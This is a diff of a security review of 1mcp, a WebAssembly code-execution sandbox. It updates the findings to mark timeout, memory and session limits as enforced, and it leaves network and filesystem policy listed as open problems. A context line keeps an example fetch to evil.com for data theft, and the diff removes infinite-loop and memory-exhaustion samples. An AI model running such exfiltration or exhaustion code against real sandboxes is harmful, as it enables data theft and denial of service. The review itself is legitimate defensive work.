@@ -6,40 +6,54 @@
 
 ## Executive Summary
 
-1mcp provides sandboxed JavaScript and Python execution through WebAssembly runtimes (QuickJS and Pyodide). While WASM provides strong isolation, **critical security gaps exist** in the current implementation that must be addressed before production use.
+1mcp provides sandboxed JavaScript and Python execution through WebAssembly runtimes (QuickJS and Pyodide). While WASM provides strong isolation, **some security gaps exist** in the current implementation that must be addressed before production use.
 
-### 🚨 CRITICAL ISSUES
+### ✅ IMPLEMENTED SECURITY FEATURES
 
-#### 1. **Policy Enforcement Not Implemented**
-- **Severity:** CRITICAL
-- **Status:** Policy classes exist but are NEVER enforced during execution
-- **Location:** `packages/server/src/harness/*-runtime.ts`
-- **Impact:**
-  - Network policies (allowedDomains, deniedDomains) are NOT enforced
-  - Filesystem policies (readonly/writable) are NOT enforced
-  - Resource limits (timeout, memory) are NOT enforced
-- **Risk:** Code can access ANY network resource and filesystem location within WASM sandbox
+#### 1. **Timeout Enforcement** ✅
+- QuickJS: Interrupt handler, Pyodide: Promise.race()
+- Config: `TIMEOUT_MS` env, `--timeout` CLI, `policy.limits.timeoutMs`
+- Exit code 124 on timeout, default 60s
 
-#### 2. **No Timeout Enforcement**
+#### 2. **Output Size Limits** ✅
+- Config: `MAX_STDOUT_BYTES` env, `--max-stdout` CLI, `policy.limits.stdoutBytes`
+- Default: 1MB stdout, 2MB stderr
+
+#### 3. **Memory Monitoring** ✅
+- QuickJS: Interrupt handler, Pyodide: 100ms polling
+- Config: `MAX_MEMORY_MB` env, `--max-memory` CLI, `policy.limits.memMb`
+- Exit code 137 on limit, default 256MB
+- Monitors Node.js heap as proxy for WASM memory
+
+#### 4. **Session Isolation** ✅
+- Per-client Pyodide instances, unique session IDs
+- Python globals reset between executions, VFS persists within session
+- 5-minute TTL, complete cross-session isolation
+
+#### 5. **Error Reporting** ✅
+- stderr combined with stdout on errors, `isError` flag set
+
+### 🚨 REMAINING CRITICAL ISSUES
+
+#### 1. **Network Policy Not Enforced**
 - **Severity:** HIGH
-- **Status:** Timeout is configured but not enforced
-- **Impact:** Infinite loops will hang the server
-- **Example:** `while(true) {}` will never terminate
-- **Risk:** Denial of Service through resource exhaustion
+- **Status:** Policy classes exist but network access not restricted
+- **Impact:** Code can access ANY network resource within WASM sandbox
+- **Risk:** Data exfiltration, SSRF attacks
 
-#### 3. **No Memory Limit Enforcement**
-- **Severity:** HIGH
-- **Status:** Memory limit is documented but not enforced
-- **Impact:** Code can consume unlimited memory within Node.js process
-- **Risk:** Out-of-memory crashes, DoS
+#### 2. **Filesystem Policy Not Enforced**
+- **Severity:** MEDIUM
+- **Status:** Policy classes exist but filesystem access not restricted
+- **Impact:** Within Pyodide virtual filesystem, no path restrictions
+- **Risk:** Access to unintended files within WASM sandbox
 
-#### 4. **Upstream MCP Server Trust**
+#### 3. **Upstream MCP Server Trust**
 - **Severity:** MEDIUM
 - **Status:** No authentication or authorization for upstream MCPs
 - **Impact:** Any configured MCP server is fully trusted
 - **Risk:** Malicious MCP server can return arbitrary data/commands
 
-#### 5. **No Rate Limiting**
+#### 4. **No Rate Limiting**
 - **Severity:** MEDIUM
 - **Status:** No rate limiting on MCP endpoints
 - **Impact:** Clients can spam execution requests
@@ -87,27 +101,6 @@ fetch('https://evil.com/steal-data')
 ```
 
 **Should be blocked** by `policy.network.allowedDomains` but ISN'T.
-
-#### 2. **Resource Limits**
-```javascript
-// CURRENTLY POSSIBLE - No timeout!
-while (true) {
-  // Infinite loop - will hang server
-}
-```
-
-**Should timeout** at `policy.limits.timeoutMs` but DOESN'T.
-
-#### 3. **Memory Exhaustion**
-```javascript
-// CURRENTLY POSSIBLE - No memory limit!
-let arr = [];
-while (true) {
-  arr.push(new Array(1000000).fill('x'));
-}
-```
-
-**Should hit** `policy.limits.memMb` but DOESN'T.
 
 ---
 
@@ -170,8 +163,8 @@ Total Request Time (warm): ~11ms
 
 ### 3. **Resource Exhaustion (DoS)**
 **Vector:** Infinite loops, memory allocation, CPU-intensive code
-**Mitigation (Current):** ❌ None - no limits enforced
-**Mitigation (Needed):** Timeout enforcement, memory limits, rate limiting
+**Mitigation (Current):** ✅ Timeout and memory limits enforced
+**Mitigation (Remaining):** Rate limiting
 
 ### 4. **Data Exfiltration**
 **Vector:** Code makes network requests to attacker-controlled servers
@@ -188,78 +181,18 @@ Total Request Time (warm): ~11ms
 ## Recommendations
 
 ### 🔴 MUST FIX (Before Production)
-
-1. **Implement Policy Enforcement in Runtimes**
-   ```typescript
-   // Add to QuickJSRuntime and PyodideRuntime
-   - Intercept fetch() calls
-   - Validate URLs against NetworkPolicy
-   - Block unauthorized requests
-   - Enforce filesystem policy for Pyodide
-   ```
-
-2. **Implement Timeout Enforcement**
-   ```typescript
-   // Use worker threads with timeout
-   - Move execution to worker_threads
-   - Set timeout via Worker termination
-   - Return timeout error to client
-   ```
-
-3. **Implement Memory Limits**
-   ```typescript
-   // Monitor memory usage
-   - Track heap size in workers
-   - Terminate on memory threshold
-   - Return OOM error to client
-   ```
-
-4. **Add Rate Limiting**
-   ```typescript
-   // Per-client rate limits
-   - Track requests per IP/API key
-   - Implement sliding window
-   - Return 429 Too Many Requests
-   ```
+1. **Network Policy** - Intercept fetch(), validate against allowlist
+2. **Rate Limiting** - Per-client limits, 429 on exceeded
 
 ### 🟡 SHOULD FIX (Before Public Use)
+3. **Authentication** - API keys, HMAC signatures
+4. **Audit Logging** - Track executions, resource usage
+5. **MCP Validation** - Certificate checks, allowlist
 
-5. **Add Authentication**
-   - API keys for MCP clients
-   - HMAC signatures for requests
-   - Token-based authentication
-
-6. **Implement Request Signing**
-   - Client signs requests
-   - Server verifies signatures
-   - Prevents request tampering
-
-7. **Add Audit Logging**
-   - Log all code executions
-   - Track resource usage
-   - Monitor for abuse patterns
-
-8. **Upstream MCP Validation**
-   - Validate MCP server certificates
-   - Implement allowlist for MCP servers
-   - Sanitize MCP tool results
-
-### 🟢 NICE TO HAVE (Future)
-
-9. **Static Analysis**
-   - Scan code for dangerous patterns
-   - Block obvious malicious code
-   - Provide warnings to clients
-
-10. **Resource Usage Quotas**
-    - Per-user execution quotas
-    - Track CPU/memory/network usage
-    - Billing integration hooks
-
-11. **Horizontal Scaling**
-    - Stateless execution workers
-    - Distributed capsule cache
-    - Load balancing support
+### 🟢 NICE TO HAVE
+6. **Static Analysis** - Scan for dangerous patterns
+7. **Quotas** - Per-user limits, billing hooks
+8. **Scaling** - Stateless workers, distributed cache
 
 ---
 
@@ -300,21 +233,13 @@ Total Request Time (warm): ~11ms
 
 **Performance is excellent** (10-15ms typical latency), making it suitable for high-throughput scenarios once security is hardened.
 
-### Immediate Action Items
-
-1. ⚠️ **DO NOT deploy to production** without implementing policy enforcement
-2. 🔧 Implement timeout enforcement to prevent DoS
-3. 🔧 Connect NetworkPolicyEnforcer to WASM runtimes
-4. 🔧 Add rate limiting to MCP endpoints
-5. 📝 Add security warnings to README
-
-### Timeline Estimate
-- **Minimum viable security:** 2-3 weeks of focused development
-- **Production-ready security:** 1-2 months with thorough testing
-- **Enterprise-ready security:** 3-6 months with audit + compliance
+### Immediate Actions
+1. ⚠️ DO NOT deploy to production without network policy enforcement
+2. Implement fetch() interception in WASM runtimes
+3. Add rate limiting to MCP endpoints
 
 ---
 
 **Signed:** Claude (AI Security Analyst)
-**Review Date:** 2025-11-06
-**Next Review:** After security fixes implemented
+**Last Updated:** 2025-11-06
+**Next Review:** After network policy enforcement implemented
